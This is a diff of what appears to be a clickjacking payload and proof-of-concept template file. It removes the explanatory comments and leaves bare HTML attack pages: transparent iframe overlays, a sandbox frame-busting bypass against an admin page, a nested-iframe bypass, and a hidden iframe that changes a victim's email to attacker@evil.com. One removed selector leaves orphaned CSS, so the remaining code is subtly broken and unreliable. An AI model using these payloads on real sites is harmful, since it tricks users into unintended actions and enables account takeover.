@@ -1,8 +1,3 @@
-# ============================================================
-# Clickjacking — Payloads & PoC Templates
-# ============================================================
-
-# ---- Basic iframe PoC ----
 <html>
 <head><style>
 iframe {
@@ -24,7 +19,6 @@ button {
 </body>
 </html>
 
-# ---- Fully Transparent iframe ----
 <html>
 <head><style>
 iframe {
@@ -35,7 +29,6 @@ iframe {
   top: 0; left: 0;
   z-index: 2;
 }
-#decoy {
   position: absolute;
   top: 0; left: 0;
   z-index: 1;
@@ -50,26 +43,10 @@ iframe {
 </body>
 </html>
 
-# ---- Frame Busting Bypass (sandbox) ----
 <iframe src="https://TARGET.COM/admin" sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
 
-# ---- X-Frame-Options Bypass via Meta ----
-# If server sends: X-Frame-Options: SAMEORIGIN
-# But a subdomain is compromised:
-# https://subdomain.target.com/page.html → can iframe target.com
-
-# ---- Double iframe Bypass ----
 <iframe src="https://trusted.target.com/embed">
   <iframe src="https://TARGET.COM/sensitive"></iframe>
 </iframe>
 
-# ---- CSP frame-ancestors Bypass (when wildcard subdomain trusted) ----
-# CSP: frame-ancestors *.target.com
-# Host xss.target.com → iframe target.com/action
-
-# ---- Drag-and-Drop Clickjacking ----
 <iframe id="droppable" src="https://TARGET.COM/email/change?newEmail=attacker@evil.com"></iframe>
-# Use HTML5 drag-and-drop to simulate interaction in hidden iframe
-
-# ---- Scroll + Click ----
-# Force victim to scroll to button position then click hidden iframe
